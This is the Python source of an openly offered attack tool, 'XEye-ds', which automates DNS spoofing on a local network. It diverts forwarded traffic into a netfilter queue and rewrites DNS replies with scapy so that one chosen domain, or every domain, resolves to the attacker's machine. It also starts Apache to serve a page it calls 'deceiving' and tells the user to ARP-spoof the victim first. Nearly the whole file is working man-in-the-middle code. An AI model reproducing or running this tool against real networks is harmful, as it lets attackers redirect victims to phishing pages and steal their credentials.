#! /usr/bin/env python3
import scapy.all as sc
import time
import subprocess
import netfilterqueue
import re
print("\t\t\n***XEye-dn***XEye-dn***XEye-dn***XEye-dn***XEye-dn***XEye-dn***XEye-dn***XEye-dn***XEye-dn***")
print("\n[Welcoming] --> Welcome to XEye-ds tool, the easy and automated DNS Spoofer ")
time.sleep(2)
def udte():
    print("\n[Info] --> The XEye-ds tool will check for its updates, please wait .....\n\n")
    time.sleep(3)
    chupd = subprocess.check_output(['git','pull'])
    chked = re.search(r"Already up to date", str(chupd))
    chkeds = re.search(r"actualizado", str(chupd))
    bupted = re.search(r"changed,", str(chupd))
    if chked or chkeds:
        #print("\n[Congrats] --> the tool is "+str(chked[0].lower()))
        print("\n[Congrats] --> The XEye-ds tool on your PC is already up to date")
        time.sleep(2)
    else:
        print("\n[Info] --> The XEye-ds tool will be updated, please wait ...... \n")
        time.sleep(3)
        if bupted:
            print("\n[Congrats] --> XEye-ds on your machine is updated. Now bugs are fixed and more features added ")
            time.sleep(3)
            print("[Instruction] --> Please rerun XEye-ds so the updates will take effect.   Exiting ........")
            time.sleep(2)
            exit()
        else:
            print("\n[Warning] --> The tool couldn't be updated, please try again or reclone the tool by following the next instructions \n")
            time.sleep(3)
            print("\n[Instruction] --> Remove the \"XEye-ds\" folder by going up one directory and by running this command \"cd ..\" ")
            print("\n[Instruction] -->  then run this cmd \"rm -rf XEye-ds\" to remove the XEye-ds folder ")
            print("\n[Instruction] --> Run this command \"git clone https://github.com/Engmostafa26/XEye-ds.git\" ")
            print(" [Assistance] --> If you need any further assistance, please contact us on our Facebook page: https://facebook.com/XEyecs")
            exit()
def Checkroot():
    who = subprocess.check_output('whoami')
    chuser = re.search(r"root", str(who))
    if chuser:
        verifywus = input("\n [Verifying] --> The XEye-ds tool needs to run with root user not only running with \"sudo\". Are you running your shell as root? [yes(y) / no(n)] " )
        if verifywus.lower() == 'y' or verifywus.lower() == 'yes' or verifywus == 'yes(y)':
            udte()
        elif verifywus.lower() == 'n' or verifywus.lower() == 'no' or verifywus.lower() == 'no(n)':
            print(" [Instruction] --> Please run \"sudo su\" command, enter the password for the current user to change to root with the pwd, then run the tool again :) \n")
            exit()
        else:
            print("[Warning] --> Invalid entry, please enter a yes or no answer - Exiting .....")
            exit()
    else:
        print("\n\n [Warning] --> You are not root - Please read and follow the instructions below: \n ")
        print("\n [Instruction] --> 1- Please run the XEye-ds tool with root user not only with \"sudo\" to perfrom DNS spoofing with no issues. ")
        print(" [Instruction] --> 2- Run \"sudo su\" command then enter the password for the current user to change to root with the pwd, then run the tool again :) \n")
        time.sleep(1)
        exit()
Checkroot()
time.sleep(2)
print("\n [Info] --> Configure Firewall for DNS spoofing compatibility - please wait .....")
# subprocess.call("sudo iptables -I INPUT -j NFQUEUE --queue-num 3",shell=True)
# subprocess.call("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 3",shell=True)
subprocess.call("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)
time.sleep(2)
print("\n[Info] --> Enabling your Apache Server - Please wait ......")
print("[Recommendation] --> It is recommended to replace the apache index.html file with a more deceiving index.html file")
time.sleep(2)
subprocess.call("sudo service apache2 start",shell=True)
time.sleep(2)
aski = input("\n[Asking] --> Do you want to DNS Spoof all the domains or a single domain? [all(a)/single(s)] ")
if aski.lower() == 'all' or aski.lower() == 'a' or aski.lower() == 'all(a)':
    domain = '.'
elif aski.lower() == 'single' or aski.lower() == 's' or aski.lower() == 'single(s)':
    domain = input("[Required] --> Please enter the target domain: ")
else:
    print("[Warning] --> Invalid entry - Please enter a yes or no answer - Exiting ....")
    time.sleep(2)
    exit()
def getip():
    interfs = subprocess.getoutput("ifconfig|grep BROADCAST")
    #iterff = subprocess.getoutput("ifconfig")
    interf = re.search(r"\w\w\w\w\d", str(interfs))
    interff = re.search(r"\w\w\w\d", str(interfs))
    if interf or interff:
        if interf:
            ipf = subprocess.getoutput("ifconfig "+interf.group(0))
            inet = re.search(r"inet", str(ipf))
            if inet:
                ipff = re.search(r"(?:\d{1,3}\.){3}\d{1,3}(?:/\d\d?)?", str(ipf))
                return ipff.group(0)
            elif interff:
                ips = subprocess.getoutput("ifconfig "+interff.group(0))
                inett = re.search(r"inet", str(ips))
                if inett:
                    ipss = re.search(r"(?:\d{1,3}\.){3}\d{1,3}(?:/\d\d?)?", str(ips))
                    return ipss.group(0)
                else:
                    print("[Warning] --> Interfaces don't have an IP address - Exiting .....")
                    time.sleep(2)
                    exit()
        elif interff:
            ips = subprocess.getoutput("ifconfig " + interff.group(0))
            inett = re.search(r"inet", str(ips))
            if inett:
                ipss = re.search(r"(?:\d{1,3}\.){3}\d{1,3}(?:/\d\d?)?", str(ips))
                return ipss.group(0)
    else:
        print("\n [Warning] --> coulnd't find a valid Interface for DNS spoofing - Exiting ....")
        time.sleep(2)
        exit()
ip = getip()
print("\n[Instruction] --> It is necessary to run ARP spoofing against your target")
print("[Instruction] --> You can use XEye-tp tool \"https://github.com/Engmostafa26/XEye-tp\"")
time.sleep(3)
try:
    print("\n[Info] --> everything is configured and DNS spoofing is about to start ........")
    print("[Intruction] --> To stop the attack, just press on the left \"ctrl+c\" ")
    time.sleep(3)
    print("[Info]--> DNS spoofing is started .......")
    def packeting(packet):
        ippacket = sc.IP(packet.get_payload())
        #print(ippacket.show())
        if ippacket.haslayer(sc.DNSRR):
            reqname = ippacket[sc.DNSQR].qname
            if domain in str(reqname):
                print("[Congrats] --> Target is spoofed and directed to "+ip+" ....")
                anspof = sc.DNSRR(rrname=domain, rdata=ip)
                ippacket[sc.DNS].an = anspof
                ippacket[sc.DNS].ancount = 1
                del ippacket[sc.IP].len
                del ippacket[sc.IP].chksum
                del ippacket[sc.UDP].len
                del ippacket[sc.UDP].chksum
                packet.set_payload(bytes(ippacket))
        packet.accept()
    nfqu = netfilterqueue.NetfilterQueue()
    nfqu.bind(0, packeting)
    nfqu.run()
except:
    print("[Info] --> Restoring all the configurations .....")
    print("[Info]--> Stopping the apache web server ....")
    subprocess.call("sudo service apache2 stop",shell=True)
    time.sleep(1)
    print("[Info] --> Flushing Iptables .....")
    subprocess.call("sudo iptables -F",shell=True)
    time.sleep(2)
    print("[Info]--> Everything is now restored :)")
    print("[Info] --> If you have any questions or need help, please message us on our FB page \"https://www.facebook.com/XEyecs/\" ")
    print("[❤] --> Thank you for using XEye-ds - Mostafa Ahmad")
